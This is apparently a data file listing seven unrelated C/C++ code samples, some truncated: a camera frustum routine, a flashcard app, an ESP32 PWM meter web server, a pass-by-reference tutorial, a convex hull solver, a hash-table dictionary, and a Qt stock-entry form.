    "#include \"CameraSceneNode.h\"\n#include \"../Lua/LuaEnvironment.h\"\n#include \"PrimeEngine/Events/StandardEvents.h\"\n#include <cmath>\n#include \"DebugRenderer.h\"\n#define Z_ONLY_CAM_BIAS 0.0f\nnamespace PE {\nnamespace Components {\n\nPE_IMPLEMENT_CLASS1(CameraSceneNode, SceneNode);\n\nCameraSceneNode::CameraSceneNode(PE::GameContext &context, PE::MemoryArena arena, Handle hMyself) : SceneNode(context, arena, hMyself)\n{\n\tm_near = 0.05f;\n\tm_far = 2000.0f;\n}\nvoid CameraSceneNode::addDefaultComponents()\n{\n\tComponent::addDefaultComponents();\n\tPE_REGISTER_EVENT_HANDLER(Events::Event_CALCULATE_TRANSFORMATIONS, CameraSceneNode::do_CALCULATE_TRANSFORMATIONS);\n}\n\nvoid CameraSceneNode::do_CALCULATE_TRANSFORMATIONS(Events::Event *pEvt)\n{\n\tHandle hParentSN = getFirstParentByType<SceneNode>();\n\tif (hParentSN.isValid())\n\t{\n\t\tMatrix4x4 parentTransform = hParentSN.getObject<PE::Components::SceneNode>()->m_worldTransform;\n\t\tm_worldTransform = parentTransform * m_base;\n\t}\n\t\n\tMatrix4x4 &mref_worldTransform = m_worldTransform;\n\n\tVector3 pos = Vector3(mref_worldTransform.m[0][3], mref_worldTransform.m[1][3], mref_worldTransform.m[2][3]);\n\tVector3 n = Vector3(mref_worldTransform.m[0][2], mref_worldTransform.m[1][2], mref_worldTransform.m[2][2]);\n\tVector3 target = pos + n;\n\tVector3 up = Vector3(mref_worldTransform.m[0][1], mref_worldTransform.m[1][1], mref_worldTransform.m[2][1]);\n\n\tn.normalize();\n\tup.normalize();\n\t\n\tVector3 right = n.crossProduct(up);\n\tright.normalize();\n\tfloat nearDist = 10.0f;\n\tfloat farDist = 20.0f;\n\tfloat wNear = 23.84f;\n\tfloat hNear = 13.41f;\n\tfloat wFar = 47.67f;\n\tfloat hFar = 26.81f;\n\n\n\tVector3 farCenter = pos + farDist * n;\n\tVector3 nearCenter = pos + nearDist * n;\n\n\tnearCoords[0] = nearCenter + (up * (hNear / 2)) - (right * (wNear / 2)); //TL\n\tnearCoords[1] = nearCenter + (up * (hNear / 2)) + (right * (wNear / 2)); //TR\n\tnearCoords[2] = nearCenter - (up * (hNear / 2)) - (right * (wNear / 2)); //BL\n\tnearCoords[3] = nearCenter - (up * (hNear / 2)) + (right * (wNear / 2)); //BR\n\n\tfarCoords[0] = farCenter + (up * (hFar / 2)) - (right * (wFar / 2)); //TL\n\tfarCoords[1] = farCenter + (up * (hFar / 2)) + (right * (wFar / 2)); //TR\n\tfarCoords[2] = farCenter - (up * (hFar / 2)) - (right * (wFar / 2)); //BL\n\tfarCoords[3] = farCenter - (up * (hFar / 2)) + (right * (wFar / 2)); //BR\n\n\tVector3 v1 = nearCoords[1] - nearCoords[2];\n\tVector3 v2 = nearCoords[3] - nearCoords[2];\n\tVector3 nearNormal = v2.crossProduct(v1);\n\tnearNormal.normalize();\n\tfloat magNear = -(nearNormal.dotProduct(nearCoords[2]));\n\tVector4 nearPlane(nearNormal.m_x, nearNormal.m_y, nearNormal.m_z, magNear);\n\n\tVector3 v3 = farCoords[1] - farCoords[2];\n\tVector3 v4 = farCoords[3] - farCoords[2];\n\tVector3 farNormal = v4.crossProduct(v3);\n\tfarNormal.normalize();\n\tfloat magFar = -(farNormal.dotProduct(farCoords[2]));\n\tVector4 farPlane(farNormal.m_x, farNormal.m_y, farNormal.m_z, magFar);\n\n\n\n\tMatrix4x4 newTransform = m_worldTransform;\n\tnewTransform.turnLeft(0.7);\n\tVector3 leftNormal = newTransform.getU();\n\tfloat magLeft = -(leftNormal.dotProduct(newTransform.getPos()));\n\tVector4 leftPlane(leftNormal.m_x, leftNormal.m_y, leftNormal.m_z, magLeft); \n\t/*\n\tVector3 v5 = farCoords[2] - farCoords[0];\n\tVector3 v6 = nearCoords[0] - farCoords[0];\n\tVector3 leftNormal = v6.crossProduct(v5);\n\tleftNormal.normalize();\n\tfloat magLeft = -(leftNormal.dotProduct(farCoords[0]));\n\tVector4 leftPlane(leftNormal.m_x, leftNormal.m_y, leftNormal.m_z, magLeft);*/\n\n\tMatrix4x4 rightTransform = m_worldTransform;\n\trightTransform.turnRight(0.7);\n\tVector3 rightNormal = rightTransform.getU();\n\tfloat magRight = -(rightNormal.dotProduct(rightTransform.getPos()));\n\tVector4 rightPlane(rightNormal.m_x, rightNormal.m_y, rightNormal.m_z, magRight);\n\t\n\t/*Vector3 v7 = farCoords[3] - farCoords[1];\n\tVector3 v8 = nearCoords[1] - farCoords[1];\n\tVector3 rightNormal = v8.crossProduct(v7);\n\trightNormal.normalize();\n\tfloat magRight = -(rightNormal.dotProduct(farCoords[1]));\n\tVector4 rightPlane(leftNormal.m_x, leftNormal.m_y, leftNormal.m_z, magRight);*/\n\n\n\tMatrix4x4 upTransform = m_worldTransform;\n\tupTransform.turnUp(0.33f * PrimitiveTypes::Constants::c_Pi_F32 / 2);\n\tVector3 upNormal = -upTransform.getN();\n\tfloat magUp = -(upNormal.dotProduct(upTransform.getPos()));\n\tVector4 upPlane(upNormal.m_x, upNormal.m_y, upNormal.m_z, magUp);\n\n\n\t/*Vector3 v9 = farCoords[1] - farCoords[0];\n\tVector3 v10 = nearCoords[0] - farCoords[0];\n\tVector3 upNormal = v10.crossProduct(v9);\n\tupNormal.normalize();\n\tfloat magUp = -(upNormal.dotProduct(farCoords[0]));\n\tVector4 upPlane(upNormal.m_x, upNormal.m_y, upNormal.m_z, magUp);*/\n\n\tMatrix4x4 downTransform = m_worldTransform;\n\tdownTransform.turnDown(0.33f * PrimitiveTypes::Constants::c_Pi_F32 / 2);\n\tVector3 downNormal = downTransform.getN();\n\tfloat magDown = -(downNormal.dotProduct(downTransform.getPos()));\n\tVector4 downPlane(downNormal.m_x, downNormal.m_y, downNormal.m_z, magDown);\n\n\t//Vector3 v11 = farCoords[3] - farCoords[2];\n\t//Vector3 v12 = nearCoords[2] - farCoords[2];\n\t//Vector3 downNormal = ",
    "#include \"spanish.h\"\n\n#include \"platform/jwin_platform_memory.cpp\"\n#include \"platform/jwin_platform_input.h\"\n#include \"platform/jfont.cpp\"\n#include \"text_input.cpp\"\n\ninline s32 \nTruncateReal32ToInt32( r32 Real32 )\n{\n  s32 Result = (s32) Real32;\n  return Result;\n}\n\ninternal void\nDrawRectangle( platform_offscreen_buffer* Buffer, r32 RealMinX, r32 RealMinY, r32 Width, r32 Height, r32 R, r32 G, r32 B )\n{\n  s32 MinX = (s32) Round( RealMinX );\n  s32 MinY = (s32) Round( RealMinY );\n  s32 MaxX = (s32) Round( RealMinX + Width);\n  s32 MaxY = (s32) Round( RealMinY + Height);\n\n  if( MinX < 0 )\n  {\n    MinX = 0;\n  }\n  if( MinY < 0 )\n  {\n    MinY = 0;\n  }\n  if( MaxX > Buffer->Width )\n  {\n    MaxX = Buffer->Width;\n  }\n  if( MaxY > Buffer->Height )\n  {\n    MaxY = Buffer->Height;\n  }\n\n  u8* Row = ( (u8*) Buffer->Memory + MinX*Buffer->BytesPerPixel + MinY*Buffer->Pitch );\n  for( s32 Y = MinY; Y < MaxY; ++Y )\n  {\n    u32* Pixel = (u32*) Row;\n    for( s32 X = MinX; X < MaxX; ++X )\n    {\n      *Pixel++ = ( (TruncateReal32ToInt32( R*255.f ) << 16 ) |\n                 (  TruncateReal32ToInt32( G*255.f ) << 8  ) |\n                 (  TruncateReal32ToInt32( B*255.f ) << 0  ) );\n    }\n    Row += Buffer->Pitch;\n  }\n}\n\nu32 CharCount(utf8_byte* Chars)\n{\n  u32 Result = 0;\n  while(*Chars++)\n  {\n    Result++;\n  }\n  return Result;\n}\n\nu32 QuestionCountInList(question_card_list* Sentinel)\n{\n  question_card_list* Card = Sentinel->Next;\n  u32 CardsLeft = 0;\n  while (Card != Sentinel)\n  {\n    CardsLeft++;\n    Card = Card->Next;\n  }\n  return CardsLeft;\n}\n\nquestion_card_list* InitiateQuestionList(question_card_list* Sentinel, question_card_list* QueueCards, u32 QuestionCardCount)\n{\n  ListInitiate(Sentinel);\n  for (int i = 0; i < QuestionCardCount; ++i)\n  {\n    question_card_list* Card = QueueCards + i;\n    Card->Question = i;\n    ListInsertBefore(Sentinel, Card);\n  }\n  return QueueCards;\n}\n\nquestion_card_list* ShuffleQueueCards(random_generator* Generator, question_card_list* Sentinel)\n{\n  u32 CardsLeft = QuestionCountInList(Sentinel);\n  question_card_list TempSentinel = {};\n  ListInitiate(&TempSentinel);\n  question_card_list* Card = Sentinel->Next;\n  while (Card != Sentinel)\n  {\n    u32 Rand = GetRandomInt(Generator, CardsLeft);\n    for (int j = 0; j < Rand; ++j)\n    {\n      Card = Card->Next;\n      jwin_Assert(Card != Sentinel);\n    }\n    ListRemove(Card);\n    ListInsertBefore(&TempSentinel, Card);\n    Card = Sentinel->Next;\n    CardsLeft--;\n  }\n  Sentinel->Next = TempSentinel.Next;\n  Sentinel->Previous = TempSentinel.Previous;\n  return Sentinel->Next;\n}\n\n// void ApplicationUpdateAndRender(application_memory* Memory, platform_offscreen_buffer* OffscreenBuffer, jwin::device_input* Input)\nextern \"C\" JWIN_UPDATE_AND_RENDER(ApplicationUpdateAndRender)\n{\n  GlobalState = JwinBeginFrameMemory(application_state);\n\n  u32 CharCount = 0x100;\n  int Padding = 3;\n  char FontPath[] = \"C:\\\\Windows\\\\Fonts\\\\consola.ttf\";\n\n  if(!GlobalState->Initialized)\n  {\n    GlobalState->TextPixelSize = 32;\n    GlobalState->OnedgeValue = 128;\n    GlobalState->PixelDistanceScale = 32.0;\n    GlobalState->FontRelativeScale = 1.f;\n    midx BufferSize = 2048;\n    utf8_byte* Buffer = PushArray(PersistentArena, BufferSize, utf8_byte);\n    GlobalState->QuestionLanguage = 0;\n    GlobalState->AnswerLanguage = 1;\n    GlobalState->InputBuffer = Utf8StringBuffer(BufferSize, Buffer);\n    GlobalState->Initialized = true;\n    GlobalState->Font = jfont::LoadSDFFont(PushArray(PersistentArena, CharCount, jfont::sdf_fontchar),\n      CharCount, FontPath,  GlobalState->TextPixelSize, Padding, GlobalState->OnedgeValue, GlobalState->PixelDistanceScale);\n    GlobalState->Library = LoadLibrary(PersistentArena);\n\n    u32 QuestionCount = GlobalState->Library.NounCount / GlobalState->Library.LanguageCount;\n\n    GlobalState->QuestionCardCount = QuestionCount;\n    GlobalState->QueueCards = PushArray(PersistentArena, GlobalState->QuestionCardCount, question_card_list);\n    InitiateQuestionList(&GlobalState->Sentinel, GlobalState->QueueCards, GlobalState->QuestionCardCount);\n\n    GlobalState->Generator = RandomGenerator(Input->RandomSeed);\n    GlobalState->CurrentCard = ShuffleQueueCards(&GlobalState->Generator, &GlobalState->Sentinel);\n  }\n  jwin::keyboard_input* Keyboard = &Input->Keyboard;\n  \n  char EggWhiteR = 0xF0;\n  char EggWhiteG = 0xF8;\n  char EggWhiteB = 0xFF;\n  char SublR = 0x30;\n  char SublG = 0x38;\n  char SublB = 0x41;\n  DrawRectangle(OffscreenBuffer, 0, 0, (r32)OffscreenBuffer->Width, (r32)OffscreenBuffer->Height, SublR/255.f, SublG/255.f, SublB/255.f );\n\n  jfont::bitmap StbBitmap = {};\n  StbBitmap.Pixels  = (u32*) OffscreenBuffer->Memory;\n  StbBitmap.Width   = OffscreenBuffer->Width;\n  StbBitmap.Height  = OffscreenBuffer->Height;\n\n\n  utf8_string_buffer* InputBuffer = &GlobalState->InputBuffer;\n  s32& QuestionLanguage = GlobalState->QuestionLanguage;\n  s32& AnswerLanguage = GlobalState->AnswerLanguage;\n\n  if(jwin::Pushed(Keyboard->Key_BACK) && InputBuffer->Position > 0)\n  {\n    EraseFromBuffer(I",
    "#include <Arduino.h>\n#include <WiFi.h>\n#include <WebServer.h>\n#include <ArduinoJson.h>\n#include <ssid.h>\n\nconst char *ssid = WIFI_SSID;\nconst char *pass = WIFI_PASSWORD;\nWebServer server(80);\n\n#define METER_PIN_1 GPIO_NUM_0\n#define METER_PIN_2 GPIO_NUM_1\n#define METER_PWM_CH_1 0\n#define METER_PWM_CH_2 1\n\n#define LOG_INTERVAL_MS 2000\n\nvoid handleRoot(void)\n{\n    server.send(200, \"application/json\", \"{}\");\n}\n\nvoid handleNotFound(void)\n{\n    server.send(404, \"application/json\", \"{\\\"message\\\": \\\"Not Found.\\\"}\");\n}\n\nvoid setPWMValue(uint8_t pwm_ch, uint8_t value)\n{\n    // 3.3V\u3092\u4e0a\u9650\u3068\u3059\u308b\u3068\u3001\u82e5\u5e72\u4f4e\u304f\u306a\u3063\u305f\u305f\u3081\u30013.1V\u3068\u3057\u3066\u8a08\u7b97\n    float_t analogValue = 256 * 3 / 3.1 * value / 100;\n    uint16_t pwmValue = (uint16_t)analogValue;\n\n    Serial.printf(\"pwm value: %d\\n\", pwmValue);\n\n    ledcWrite(pwm_ch, analogValue);\n}\n\nvoid handleSingle(const char *path, uint8_t pwm_ch)\n{\n    if (server.method() != HTTP_POST)\n    {\n        server.send(405, \"application/json\", \"{\\\"message\\\": \\\"Method Not Allowed.\\\"}\");\n        return;\n    }\n    Serial.printf(\"POST /%s\\r\\n\", path);\n\n    String requestBody = server.arg(\"plain\");\n    Serial.printf(\"request body: %s\\r\\n\", requestBody.c_str());\n\n    DynamicJsonDocument doc(1024);\n    DeserializationError error = deserializeJson(doc, requestBody);\n\n    if (error)\n    {\n        Serial.println(\"failed to deserialize\");\n        Serial.printf(\"POST /%s 400\\r\\n\", path);\n        server.send(400, \"application/json\", \"{\\\"message\\\": \\\"Bad Request.\\\"}\");\n        return;\n    }\n\n    int32_t value = doc[\"value\"].as<int32_t>();\n\n    if (value < 0 || 100 < value)\n    {\n        Serial.printf(\"POST /%s 400\\r\\n\", path);\n        server.send(400, \"application/json\", \"{\\\"message\\\": \\\"Bad Request. Unexpected value.\\\"}\");\n        return;\n    }\n\n    Serial.printf(\"input value: %d\\n\", value);\n\n    setPWMValue(pwm_ch, value);\n\n    Serial.printf(\"POST /%s 200\\r\\n\", path);\n    server.send(200, \"text/json\", \"{\\\"message\\\": \\\"Success.\\\"}\");\n}\n\nvoid handleCPU(void)\n{\n    handleSingle(\"cpu\", METER_PWM_CH_1);\n}\n\nvoid handleMEM(void)\n{\n    handleSingle(\"mem\", METER_PWM_CH_2);\n}\n\nvoid handleValues()\n{\n    if (server.method() != HTTP_POST)\n    {\n        server.send(405, \"application/json\", \"{\\\"message\\\": \\\"Method Not Allowed.\\\"}\");\n        return;\n    }\n    Serial.printf(\"POST /values\\r\\n\");\n\n    String requestBody = server.arg(\"plain\");\n    Serial.printf(\"request body: %s\\r\\n\", requestBody.c_str());\n\n    DynamicJsonDocument doc(1024);\n    DeserializationError error = deserializeJson(doc, requestBody);\n\n    if (error)\n    {\n        Serial.println(\"failed to deserialize\");\n        Serial.printf(\"POST /values 400\\r\\n\");\n        server.send(400, \"application/json\", \"{\\\"message\\\": \\\"Bad Request.\\\"}\");\n        return;\n    }\n\n    int32_t cpuValue = doc[\"cpu\"].as<int32_t>();\n\n    if (cpuValue < 0 || 100 < cpuValue)\n    {\n        Serial.printf(\"POST /values 400\\r\\n\");\n        server.send(400, \"application/json\", \"{\\\"message\\\": \\\"Bad Request. Unexpected value.\\\"}\");\n        return;\n    }\n\n    int32_t memValue = doc[\"mem\"].as<int32_t>();\n\n    if (cpuValue < 0 || 100 < memValue)\n    {\n        Serial.printf(\"POST /values 400\\r\\n\");\n        server.send(400, \"application/json\", \"{\\\"message\\\": \\\"Bad Request. Unexpected value.\\\"}\");\n        return;\n    }\n\n    Serial.printf(\"input value: cpu:%d mem:%d\\n\", cpuValue, memValue);\n\n    setPWMValue(METER_PWM_CH_1, cpuValue);\n    setPWMValue(METER_PWM_CH_2, memValue);\n\n    Serial.printf(\"POST /values 200\\r\\n\");\n    server.send(200, \"text/json\", \"{\\\"message\\\": \\\"Success.\\\"}\");\n}\n\nvoid setup()\n{\n    Serial.begin(9600);\n\n    // PWM\u306e\u8a2d\u5b9a\n    pinMode(METER_PIN_1, OUTPUT);\n    ledcSetup(METER_PWM_CH_1, 1000, 8);\n    ledcAttachPin(METER_PIN_1, METER_PWM_CH_1);\n    ledcWrite(METER_PWM_CH_1, 0);\n    pinMode(METER_PIN_2, OUTPUT);\n    ledcSetup(METER_PWM_CH_2, 1000, 8);\n    ledcAttachPin(METER_PIN_2, METER_PWM_CH_2);\n    ledcWrite(METER_PWM_CH_2, 0);\n\n    // WiFi\u306e\u63a5\u7d9a\n    WiFi.begin(ssid, pass);\n    while (WiFi.status() != WL_CONNECTED)\n    {\n        delay(500);\n    }\n    Serial.print(\"IP:\");\n    Serial.println(WiFi.localIP());\n\n    // Web\u30b5\u30fc\u30d0\u306e\u958b\u59cb\n    server.on(\"/\", handleRoot);\n    server.on(\"/cpu\", HTTP_POST, handleCPU);\n    server.on(\"/mem\", HTTP_POST, handleMEM);\n    server.on(\"/values\", HTTP_POST, handleValues);\n    server.onNotFound(handleNotFound);\n    server.begin();\n}\n\nunsigned long lastLogTimeMS = 0;\n\nvoid loop()\n{\n    unsigned long now = millis();\n\n    server.handleClient();\n\n    if (now > lastLogTimeMS + LOG_INTERVAL_MS)\n    {\n        lastLogTimeMS = now;\n\n        Serial.printf(\"[%12d]IP:%s \\r\\n\", now, WiFi.localIP());\n        Serial.printf(\"[%12d]CPU: %d, MEM: %d\\r\\n\", now, ledcRead(METER_PWM_CH_1), ledcRead(METER_PWM_CH_2));\n    }\n}",
    "// program to illustrate the concepts of object as argument of function (pass by values , pass by reference)\n#include <iostream>\nusing namespace std;\n\nclass complex\n{\n    int real;\n    int imag;\n    public:\n    complex(): real(0),imag(0){};                           // default constructor where values are initilized with zero\n    complex(int r,int i): real(r),imag(i){};   // parameterized constructor where values are initilized with\n                                                                    // values passed as arguments\n\n    void passby_value(complex obj1)  // PASS BY VALUE\n    {\n        obj1.real=1;\n        obj1.imag=3;\n        cout<<obj1.real<<\"+i\"<<obj1.imag;\n    }\n\n    void passby_ref_ptr(complex* obj1) // pass by reference using  object pointer \n    {\n      obj1->real=4;\n      obj1->imag=8;\n      cout<<obj1->real<<\"+i\"<<obj1->imag;\n        \n    }\n    \n    void passby_ref_ref(complex &obj1) // pass by refrence using reference object\n    {\n       obj1.real=9;\n       obj1.imag=6;\n       cout<<obj1.real<<\"+i\"<<obj1.imag;\n    }\n    void print_data()\n    {\n        cout<<real<<\"+i\"<<imag<<endl;\n    }\n\n};\n\nint main()\n{\n    complex o1(2,4);\n    cout<<\"\\nPASS BY VALUE FOR OBJECT (o1):: \"<<endl;\n    cout<<\"\\nbefore passing argument :\";\n    o1.print_data();\n    cout<<\"after passing argument :: \";\n    o1.passby_value(o1);\n    cout<<\"\\noriginal parameter ::\";\n    o1.print_data();\n\n    complex o2(3,2);\n    cout<<\"\\nPASS BY REFERENCE USING POINTER FOR OBJECT (o1):: \"<<endl;\n    cout<<\"\\nbefore passing argument :\";\n    o2.print_data();\n    cout<<\"after passing argument :: \";\n    o2.passby_ref_ptr(&o2);\n    cout<<\"\\noriginal parameter ::\";\n    o2.print_data();\n\n    complex o3(9,9);\n    cout<<\"\\nPASS BY REFERENCE USING REFERENCE OBJECT FOR OBJECT (o1):: \"<<endl;\n    cout<<\"\\nbefore passing argument :\";\n    o3.print_data();\n    cout<<\"after passing argument :: \";\n    o3.passby_ref_ref(o3);\n    cout<<\"\\noriginal parameter ::\";\n    o3.print_data();\n    \n    return 0;\n    \n}",
    "/*\n\u51f8\u5305\uff1a\u70b9\u96c6\u4e2d\u7531\u6700\u5c0f\u70b9\u96c6\u6784\u6210\u7684\u6700\u5927\u51f8\u8fb9\u578b\n\u7b97\u6cd5\uff1a\u5206\u4e3a\u4e0b\u51f8\u5305\u548c\u4e0b\u51f8\u5305\n\u6309\u7167x\u5347\u5e8f\uff0cy\u5347\u5e8f\u6392\u5e8f\uff0c\u53ef\u77e5\u7b2c\u4e00\u4e2a\u70b9\u548c\u6700\u540e\u4e00\u4e2a\u70b9\u5fc5\u7136\u5728\u51f8\u5305\u70b9\u4e2d\n\u4e0b\u51f8\u5305\uff1a\u6b63\u5411\u904d\u5386\u6240\u6709\u70b9\uff0c\u6808\u9876\u4e3atop\uff0c\u5c06top-1\u6307\u5411top\u7684\u70b9\u89c6\u4e3aa\u5411\u91cf\n\u82e5\u65b0\u70b9\u5728a\u5411\u91cf\u53f3\u4fa7\u6216\u8005\u5171\u7ebf\uff0c\u5219\u5220\u9664\u65e7\u70b9\uff08\u4e0d\u53ef\u5220\u9664\u7b2c\u4e00\u4e2a\u70b9\uff09\uff0c\u65b0\u70b9\u65e0\u8bba\u5982\u4f55\u90fd\u8981\u52a0\u5165\u6808\n\n\u4e0a\u51f8\u5305\uff1a\u4ece\u5012\u6570\u7b2c\u4e8c\u4e2a\u70b9\u5f00\u59cb\u904d\u5386\uff08\u6700\u540e\u4e00\u4e2a\u70b9\u80af\u5b9a\u5df2\u7ecf\u52a0\u5165\u6808\u4e2d\uff09\uff0c\u539f\u5219\u662f\u4e0d\u53efpop\u4e0a\u51f8\u5305\u7684\u70b9\uff0c\u5728\u4ee3\u7801\u4e2d\u4f53\u73b0\uff0c\u82e5\u65b0\u70b9\u5728a\u5411\u91cf\u53f3\u4fa7\u6216\u8005\u5171\u7ebf\uff0c\u5220\u9664\u65e7\u70b9\uff0c\u65b0\u70b9\u65e0\u8bba\u5982\u4f55\u90fd\u8981\u52a0\u5165\u6808\n\n\u6700\u540e\u6808\u7684\u7ed3\u679c\u662f\u51f8\u5305\u73af\uff0c\u5373\u6808\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u7b49\u4e8e\u6700\u540e\u4e00\u4e2a\u5143\u7d20\n\n\u5224\u65ad\u65b0\u70b9\u5728\u5411\u91cf\u4f4d\u7f6e\u7684\u65b9\u6cd5\uff1a\n\u8865\u5145\uff1a\u5bf9\u4e8ex,y,z\u70b9\uff0c\u6211\u4eec\u6709\u4e24\u5411\u91cfy-x\uff0cz-y\uff0c\u662f\u8fd9\u4e24\u4e2a\u5411\u91cf\u505a\u53c9\u4e58\n\u53c9\u79ef\uff1a\u5373\u5bf9\u5411\u91cf\uff08x1,y1\uff09(x2,y2)\u6765\u8bf4\uff0cans = x1*y2-x2*y1\n\u82e5ans>=0\uff0c\u5219\u5728\u53f3\u4fa7\u6216\u8005\u5171\u7ebf\uff0c\u9700pop\u65e7\u70b9\n\u5426\u5219\u76f4\u63a5\u52a0\u5165\u6808\n\n\u590d\u6742\u5ea6\uff1a\u53d6\u51b3\u4e8e\u6392\u5e8f\uff0c\u4e3anlogn\n\n\n\n*/\n\n#include <iostream>\n#include <cstring>\n#include <algorithm>\n#include <cmath>\nusing namespace std;\n\nconst int N=100010;\nstruct Point{double x,y;} p[N],s[N];\nint n,top;\n\ndouble cross(Point a,Point b,Point c){ //\u53c9\u79ef\n  return (b.x-a.x)*(c.y-a.y)-(b.y-a.y)*(c.x-a.x);\n}\ndouble dis(Point a,Point b){ //\u8ddd\u79bb\n  return sqrt((a.x-b.x)*(a.x-b.x)+(a.y-b.y)*(a.y-b.y));\n}\nbool cmp(Point a, Point b){ //\u6bd4\u8f83\n  return a.x!=b.x ? a.x<b.x : a.y<b.y;\n}\ndouble Andrew(){\n  sort(p+1,p+n+1,cmp); //\u6392\u5e8f\n  for(int i=1; i<=n; i++){ //\u4e0b\u51f8\u5305\n    while(top>1&&cross(s[top-1],s[top],p[i])<=0)top--;\n    s[++top]=p[i];\n  }\n  int t=top;\n  for(int i=n-1; i>=1; i--){ //\u4e0a\u51f8\u5305\n    while(top>t&&cross(s[top-1],s[top],p[i])<=0)top--;\n    s[++top]=p[i];\n  }\n  double res=0; //\u5468\u957f\n  for(int i=1; i<top; i++) res+=dis(s[i],s[i+1]);\n  return res;\n}\nint main(){\n  scanf(\"%d\",&n);\n  for(int i=1;i<=n;i++)scanf(\"%lf%lf\",&p[i].x,&p[i].y);\n  printf(\"%.2lf\\n\", Andrew());\n  return 0;\n}\n",
    "// Do NOT add any other includes\r\n\r\n#include \"dict.h\"\r\n\r\nconst double Dict::LOAD_FACTOR_THRESHOLD = 0.7;\r\nunsigned long Dict::hashFunction(const string& word) {\r\n    unsigned long hash = 5381;\r\n    for (char ch : word) {\r\n        hash = ((hash << 5) + hash) + ch; // hash * 33 + ch\r\n    }\r\n    return hash % currentTableSize;\r\n}\r\nstring toLowerCase(std::string& str) {\r\n    string result = str;\r\n    for (char& c : str) {\r\n        c = tolower(c);\r\n    }\r\n    return result;\r\n}\r\nvoid Dict::resizeTable() {\r\n    int newTableSize = (currentTableSize * 2)%(numeric_limits<int>::max());\r\n    vector<WordNode*> newHashTable(newTableSize, nullptr);\r\n\r\n    for (WordNode* node : hashTable) {\r\n        while (node != nullptr) {\r\n            WordNode* temp = node;\r\n            node = node->next;\r\n\r\n            int newIndex = hashFunction(temp->word);\r\n            temp->next = newHashTable[newIndex];\r\n            newHashTable[newIndex] = temp;\r\n        }\r\n    }\r\n\r\n    hashTable = move(newHashTable);\r\n    currentTableSize = newTableSize;\r\n}\r\nDict::Dict() : currentTableSize(INITIAL_TABLE_SIZE) {\r\n    hashTable.resize(currentTableSize, nullptr);\r\n}\r\n\r\nDict::~Dict(){\r\n    // Implement your function here   \r\n    for (WordNode* node : hashTable) {\r\n        while (node != nullptr) {\r\n            WordNode* temp = node;\r\n            node = node->next;\r\n            delete temp;\r\n        }\r\n    }\r\n    \r\n}\r\nint Dict::get_word_count(string word) {\r\n    word = toLowerCase(word);\r\n\r\n    int index = hashFunction(word);\r\n\r\n    WordNode* current = hashTable[index];\r\n    while (current != nullptr) {\r\n        if (current->word == word) {\r\n            return current->count;\r\n        }\r\n        current = current->next;\r\n    }\r\n\r\n    return 0;\r\n}\r\nbool isalnum1(char c) {\r\n    string punctuationMarks = \".,-:! \\\"'()?\u2014[]\u02d9;@\";\r\n    return punctuationMarks.find(c) == string::npos;\r\n}\r\nvoid Dict::insert_sentence(int book_code, int page, int paragraph, int sentence_no, string sentence) {\r\n    string word;\r\n    size_t start = 0;\r\n    size_t end = 0;\r\n\r\n    while (end < sentence.length()) {\r\n        while (end < sentence.length() && isalnum1(sentence[end])) {\r\n            ++end;\r\n        }\r\n\r\n        word = sentence.substr(start, end - start);\r\n        toLowerCase(word);\r\n        int index = hashFunction(word);\r\n        \r\n        WordNode* current = hashTable[index];\r\n        while (current != nullptr) {\r\n            if (current->word == word) {\r\n                // Word already exists in the hash table\r\n                // Update the necessary information (e.g., count)\r\n                // Assuming WordNode has book_code, page, paragraph, sentence_no attributes\r\n                current->count++;\r\n                current->book_code = book_code;\r\n                current->page = page;\r\n                current->paragraph = paragraph;\r\n                current->sentence_no = sentence_no;\r\n                break;\r\n            }\r\n            current = current->next;\r\n        }\r\n\r\n        if (current == nullptr) {\r\n            // Word does not exist in the hash table\r\n            WordNode* newNode = new WordNode(word);\r\n            newNode->count = 1;\r\n            newNode->book_code = book_code;\r\n            newNode->page = page;\r\n            newNode->paragraph = paragraph;\r\n            newNode->sentence_no = sentence_no;\r\n\r\n            // Insert the new node at the beginning of the linked list\r\n            newNode->next = hashTable[index];\r\n            hashTable[index] = newNode;\r\n        }\r\n\r\n        start = end + 1;\r\n        while (start < sentence.length() && !isalnum1(sentence[start])) {\r\n            ++start;\r\n        }\r\n\r\n        end = start;\r\n    }\r\n}\r\n\r\n// void merge(vector<pair<string, int>>& arr, int left, int middle, int right) {\r\n//     int n1 = middle - left + 1;\r\n//     int n2 = right - middle;\r\n//     vector<pair<string, int>> leftArr(n1);\r\n//     vector<pair<string, int>> rightArr(n2);\r\n\r\n//     for (int i = 0; i < n1; i++) {\r\n//         leftArr[i] = arr[left + i];\r\n//     }\r\n//     for (int j = 0; j < n2; j++) {\r\n//         rightArr[j] = arr[middle + 1 + j];\r\n//     }\r\n//     int i = 0, j = 0, k = left;\r\n//     while (i < n1 && j < n2) {\r\n//         if (leftArr[i].first <= rightArr[j].first) {\r\n//             arr[k] = leftArr[i];\r\n//             i++;\r\n//         } else {\r\n//             arr[k] = rightArr[j];\r\n//             j++;\r\n//         }\r\n//         k++;\r\n//     }\r\n//     while (i < n1) {\r\n//         arr[k] = leftArr[i];\r\n//         i++;\r\n//         k++;\r\n//     }\r\n//     while (j < n2) {\r\n//         arr[k] = rightArr[j];\r\n//         j++;\r\n//         k++;\r\n//     }\r\n// }\r\n// void mergeSort(vector<pair<string, int>>& arr, int left, int right) {\r\n//     if (left < right) {\r\n//         int middle = left + (right - left) / 2;\r\n\r\n//         mergeSort(arr, left, middle);\r\n//         mergeSort(arr, middle + 1, right);\r\n\r\n//         merge(arr, left, middle, right);\r\n//     }\r\n// }\r\nvoid Dict::dump_dictionary(string filename) {\r\n    ofstream outfile(filename",
    "#include \"inputstock.h\"\r\n#include \"ui_inputstock.h\"\r\n\r\ninputStock::inputStock(QWidget *parent) :\r\n    QWidget(parent),\r\n    ui(new Ui::inputStock)\r\n{\r\n    ui->setupUi(this);\r\n\r\n    //\u7981\u6b62\u7a97\u53e3\u6700\u5927\u5316\u6309\u94ae\r\n    setWindowFlags(windowFlags()&~Qt::WindowMaximizeButtonHint);\r\n\r\n    //\u7981\u6b62\u7528\u6237\u62d6\u62c9\u7a97\u53e3\u6539\u53d8\u5927\u5c0f\r\n    setFixedSize(this->width(), this->height());\r\n\r\n    //\u5149\u6807\u5b9a\u4f4d\r\n    ui->lineEditId->setFocus();\r\n}\r\n\r\ninputStock::~inputStock()\r\n{\r\n    delete ui;\r\n}\r\n\r\nvoid inputStock::on_inStockBtn_clicked()\r\n{\r\n    QString stockId = ui->lineEditId->text();\r\n    QString stockName = ui->lineEditName->text();\r\n    QString stockCount = ui->lineEditCount->text();\r\n    QString stockProject = 